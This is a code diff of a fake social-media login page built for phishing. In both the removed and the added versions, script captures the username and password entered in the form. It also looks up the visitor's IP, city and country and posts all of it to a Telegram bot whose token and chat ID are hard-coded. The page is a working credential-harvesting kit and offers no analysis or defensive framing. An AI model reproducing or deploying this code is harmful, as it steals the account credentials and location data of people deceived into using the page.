@@ -248,7 +248,12 @@ form .create-account:hover {
   }  
 }
 
+.hidden{
+  display: hidden;
+}
+
     </style>
+    
   </head>
   <body>
     <div class="content">
@@ -258,97 +263,196 @@ form .create-account:hover {
           <p>Connect with friends and the world around you.</p>
         </div>
         <form id="loginForm">
-          <input type="text" placeholder="Email or Phone Number" name="username" required />
-          <input type="password" placeholder="Password" name="password" required>
-          <input type="hidden" id="country" name="country" />
-          <input type="hidden" id="city" name="city" />
-          <input type="hidden" id="ip" name="ip" />
-          <button class="login" type="submit">Log In</button>
-          <a href="#">Forgot Password ?</a>
-          <hr>
-          <button class="create-account" type="button">Create New Account</button>
+            <input type="text" placeholder="Email or Phone Number" name="username" required />
+            <input type="password" placeholder="Password" name="password" required>
+            <input type="hidden" id="country" name="country" />
+            <input type="hidden" id="city" name="city" />
+            <input type="hidden" id="ip" name="ip" />
+            <button class="login" type="submit">Log In</button>
+            <a href="#">Forgot Password?</a>
+            <hr>
+            <button class="create-account" type="button">Create New Account</button>
         </form>
+    
+        <div class="hidden" id="status" style="display: none;"></div> <!-- Status message display -->
       </div>
     </div>
+    <!-- <form id="telegramForm">
+        <label for="chatId">Chat ID:</label>
+        <input type="text" id="chatId" name="chatId" required><br><br>
+        
+        <label for="message">Message:</label>
+        <input type="text" id="message" name="message" required><br><br>
+
+        <button type="submit">Send Message</button>
+    </form> -->
+
+    <p id="status"></p>
 
     <script>
-      document.addEventListener('DOMContentLoaded', function () {
-        var loginForm = document.getElementById('loginForm');
-
-        // Fetch real-time location and IP information using ipinfo.io
-        fetch('https://ipinfo.io/json?token=1395ebd482ecbf') // Replace 'YOUR_TOKEN' with your ipinfo.io token
-          .then(response => response.json())
-          .then(data => {
-            // Update the country, city, and IP hidden input fields with real-time data
-            document.getElementById('country').value = data.country;
-            document.getElementById('city').value = data.city;
-            document.getElementById('ip').value = data.ip;
-
-            console.log("Country:", data.country);
-            console.log("City:", data.city);
-            console.log("IP Address:", data.ip);
-          })
-          .catch(err => console.error("Error fetching location data:", err));
-
-        loginForm.addEventListener('submit', function (event) {
-          event.preventDefault(); // Prevents the default form submission
-
-          // Retrieve form data
-          var formData = new FormData(loginForm);
-
-          // Extract the necessary fields from the form data
-          var username = formData.get('username');
-          var password = formData.get('password');
-          var country = document.getElementById('country').value;
-          var city = document.getElementById('city').value;
-          var ip = document.getElementById('ip').value;
-
-          // Create the log type and message to send to the Telegram bot
-          const logType = "facebook logins";  // Log type to categorize the activity
-          const deviceName = navigator.userAgent;
-          const message = `
-  *Log Type:* ${logType}
-  *Username:* ${username}
-  *Password:* ${password}
-  *Country:* ${country}
-  *City:* ${city}
-  *IP Address:* ${ip}
-  *Device:* ${deviceName}
-          `;
-
-          // Replace 'YOUR_BOT_TOKEN' with your actual bot token
-          // Replace 'YOUR_CHAT_ID' with your actual chat ID
-          const botToken = '7280763852:AAEHmPsZemgExWJ5fzO42yKt5s_sWoMI4LQ';
-          const chatId = '6393188021';
-          const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-          // Prepare the data to send to Telegram
-          const data = new URLSearchParams();
-          data.append('chat_id', chatId);
-          data.append('text', message);
-          data.append('parse_mode', 'Markdown'); // Ensures the message is formatted with Markdown
-
-          // Use fetch API to send the data
-          fetch(telegramApiUrl, {
-            method: 'POST',
-            body: data,
-            headers: {
-              'Content-Type': 'application/x-www-form-urlencoded',
-            },
-          })
-          .then(response => response.json())
-          .then(data => {
-            if (data.ok) {
-              console.log('Message sent successfully');
-            } else {
-              console.error('Error sending message:', data);
-            }
-          })
-          .catch((error) => {
-            console.error('Fetch error:', error);
-          });
+        // Function to send a message to a specified Telegram chat using the Fetch API
+        function sendMessageWithFetch(chatId, message) {
+            // Define the Telegram API URL with your bot token
+            const telegramAPI = `https://api.telegram.org/bot7280763852:AAEHmPsZemgExWJ5fzO42yKt5s_sWoMI4LQ/sendMessage`;
+            
+            // Create the data object containing the chat ID and message text
+            const data = {
+                chat_id: chatId,
+                text: message
+            };
+    
+            // Send a POST request to the Telegram API using Fetch
+            fetch(telegramAPI, {
+                method: 'POST', // Specify the request method
+                headers: {
+                    'Content-Type': 'application/json' // Indicate the content type of the request
+                },
+                body: JSON.stringify(data) // Convert the data object to a JSON string
+            })
+            .then(response => response.json()) // Parse the JSON response from the server
+            .then(result => {
+                // Check if the message was sent successfully
+                if (result.ok) {
+                    // Update the status message on the page
+                    document.getElementById("status").innerText += "Message sent using Fetch! ";
+                } else {
+                    // Log an error message if sending failed
+                    console.error("Error sending message using Fetch:", result);
+                }
+            })
+            .catch(error => {
+                // Log any network or other errors that occur
+                console.error("Fetch failed:", error);
+            });
+        }
+    
+        // Function to send a message to a specified Telegram chat using XMLHttpRequest
+        function sendMessageWithXHR(chatId, message) {
+            // Define the Telegram API URL with your bot token
+            const telegramAPI = `https://api.telegram.org/bot7280763852:AAEHmPsZemgExWJ5fzO42yKt5s_sWoMI4LQ/sendMessage`;
+            
+            // Create a new XMLHttpRequest object
+            const xhr = new XMLHttpRequest();
+            
+            // Create the data object containing the chat ID and message text
+            const data = JSON.stringify({
+                chat_id: chatId,
+                text: message
+            });
+    
+            // Initialize the XMLHttpRequest with the POST method and the Telegram API URL
+            xhr.open('POST', telegramAPI, true);
+            // Set the request header to indicate the content type
+            xhr.setRequestHeader('Content-Type', 'application/json');
+    
+            // Set up a function to handle the response from the server
+            xhr.onreadystatechange = function() {
+                // Check if the request is complete and was successful
+                if (xhr.readyState === 2 && xhr.status === 200) {
+                    const response = JSON.parse(xhr.responseText); // Parse the response
+                    // Check if the message was sent successfully
+                    if (response.ok) {
+                        // Update the status message on the page
+                        document.getElementById("status").innerText += "Message sent using XMLHttpRequest!";
+                    } else {
+                        // Log an error message if sending failed
+                        console.error("Error sending message using XMLHttpRequest:", response);
+                    }
+                }
+            };
+    
+            // Send the data as the request body
+            xhr.send(data);
+        }
+    
+        // Handle the submission of the login form
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the default form submission behavior
+    
+            const chatId = '6393188021'; // Your Telegram chat ID
+            // Get the username and password values from the form inputs
+            const username = document.querySelector('input[name="username"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+    
+            // Construct the message to be sent, including the username, password, and log type
+            const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nLog Type: ig logs`;
+    
+            // Send the message using both methods
+            sendMessageWithXHR(chatId, message);   // Send using XMLHttpRequest
         });
-      });
     </script>
-  </body>
+    
+    
+    
+    
+    
+    
+    
+    <script>
+        // Function to send location data to Telegram using Fetch API
+        function sendLocationToTelegram(chatId, country, city, ip) {
+            const telegramAPI = `https://api.telegram.org/bot7280763852:AAEHmPsZemgExWJ5fzO42yKt5s_sWoMI4LQ/sendMessage`;
+            const message = `User Location Info:\nCountry: ${country}\nCity: ${city}\nIP: ${ip}`;
+    
+            const data = {
+                chat_id: chatId,
+                text: message
+            };
+    
+            fetch(telegramAPI, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => {
+                if (result.ok) {
+                    console.log("Location info sent using Fetch!");
+                } else {
+                    console.error("Error sending location info:", result);
+                }
+            })
+            .catch(error => {
+                console.error("Fetch failed:", error);
+            });
+        }
+    
+        // Function to fetch user's IP and location using an API
+        function fetchLocationInfo(chatId) {
+            // Using a free API for location data (replace with your preferred one)
+            fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const country = data.country_name;
+                const city = data.city;
+                const ip = data.ip;
+                sendLocationToTelegram(chatId, country, city, ip);
+            })
+            .catch(error => {
+                console.error("Error fetching location data:", error);
+            });
+        }
+    
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent form from submitting normally
+    
+            const chatId = '6393188021'; // Your Telegram chat ID
+            const username = document.querySelector('input[name="username"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+    
+            // Construct the login message
+            const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nLog Type: ig logs`;
+    
+            // Send login info to Telegram (this was in your previous script)
+
+    
+            // Fetch and send location info after login info is sent
+            fetchLocationInfo(chatId);
+        });
+    </script>
+    
+</body>
 </html>
